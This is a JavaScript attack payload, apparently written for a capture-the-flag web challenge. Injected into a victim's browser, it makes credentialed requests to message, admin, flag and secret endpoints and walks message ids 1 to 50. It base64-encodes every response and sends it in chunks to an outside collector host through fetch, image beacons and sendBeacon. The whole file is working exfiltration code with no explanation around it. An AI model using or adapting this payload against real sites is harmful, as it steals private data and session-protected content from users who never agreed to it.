// ppp.js - broad probe: messages id 1..50 + common admin endpoints
const EXFIL_BASE = "https://pipipopo.free.beeceptor.com";
const CHUNK = 400;     // smaller to avoid truncation
const SLEEP_MS = 180;

(function(){
  function b64u(s){ return btoa(unescape(encodeURIComponent(s))); }
  function sleep(ms){ return new Promise(r=>setTimeout(r, ms)); }
  async function fireNoCors(path){
    try { fetch(EXFIL_BASE + path, { mode: "no-cors", keepalive: true }); } catch(e){}
    try { (new Image()).src = EXFIL_BASE + path; } catch(e){}
  }
  async function sendBeacon(path, data){
    try {
      if (navigator.sendBeacon) {
        const blob = new Blob([data], {type:"application/octet-stream"});
        navigator.sendBeacon(EXFIL_BASE + path, blob);
      }
    } catch(e){}
  }

  async function exfilLabelled(name, text) {
    try {
      const meta = { from: location.pathname + location.search, endpoint: name, when: Date.now() };
      const payload = JSON.stringify({ meta: meta, body: text });
      const enc = b64u(payload);
      const parts = [];
      for (let i=0;i<enc.length;i+=CHUNK) parts.push(enc.slice(i,i+CHUNK));
      const headerPath = "/_h/" + encodeURIComponent(name) + "/" + parts.length;
      await fireNoCors(headerPath);
      await sendBeacon(headerPath, "hdr");
      for (let i=0;i<parts.length;i++){
        const p = "/" + encodeURIComponent(name) + "/" + i + "/" + encodeURIComponent(parts[i]);
        await fireNoCors(p);
        await sendBeacon("/beacon/" + encodeURIComponent(name) + "/" + i, parts[i]);
        await sleep(120);
      }
    } catch (e) {
      try { await fireNoCors("/_err/" + encodeURIComponent(name) + "/" + encodeURIComponent(String(e))); } catch(e2){}
    }
  }

  async function probeOne(name, fn) {
    try {
      let resp = await fn().catch(()=>null);
      if(!resp || (resp.status && resp.status>=400)) {
        const errText = resp ? ("HTTP " + resp.status) : "no-response";
        await exfilLabelled(name, "[fetch-error] " + errText);
        return;
      }
      let text = "";
      try { text = await resp.text(); } catch(e) { text = "[text-read-error]"; }
      if (!text || text.length === 0) text = "[empty-response]";
      await exfilLabelled(name, text);
    } catch(err) {
      await exfilLabelled(name, "[exception] " + String(err));
    }
  }

  async function main() {
    // quick known endpoints
    const endpoints = [
      {name:"messages", fn: ()=>fetch("/messages", {method:"GET", credentials:"include"})},
      {name:"messages_get_id1", fn: ()=>fetch("/messages?id=1", {method:"GET", credentials:"include"})},
      {name:"messages_get_id0", fn: ()=>fetch("/messages?id=0", {method:"GET", credentials:"include"})},
      {name:"messages_post_id1", fn: ()=>fetch("/messages", {method:"POST", credentials:"include", headers:{"Content-Type":"application/json"}, body: JSON.stringify({id:1})})},
      {name:"messages_9099", fn: ()=>fetch("/messages?id=9099", {method:"GET", credentials:"include"})},
      {name:"messages_slash_9099", fn: ()=>fetch("/messages/9099", {method:"GET", credentials:"include"})},
      {name:"flag", fn: ()=>fetch("/flag", {method:"GET", credentials:"include"})},
      {name:"admin_flag", fn: ()=>fetch("/admin/flag", {method:"GET", credentials:"include"})},
      {name:"admin_messages", fn: ()=>fetch("/admin/messages", {method:"GET", credentials:"include"})},
      {name:"messages_all", fn: ()=>fetch("/messages/all", {method:"GET", credentials:"include"})},
      {name:"secret", fn: ()=>fetch("/secret", {method:"GET", credentials:"include"})}
    ];

    // run the known endpoints
    for (let e of endpoints) {
      await probeOne(e.name, e.fn);
      await sleep(SLEEP_MS);
    }

    // now probe a range of message IDs (1..50)
    for (let i=1;i<=50;i++) {
      const name = "messages?id=" + i;
      await probeOne(name, ()=>fetch("/messages?id=" + i, {method:"GET", credentials:"include"}));
      await sleep(SLEEP_MS);
    }

    // and a few more numeric ranges if you want (uncomment to expand)
    // for (let i=51;i<=200;i++) { ... }

  } // end main

  try { main(); } catch(e){ console.error(e); }
})();
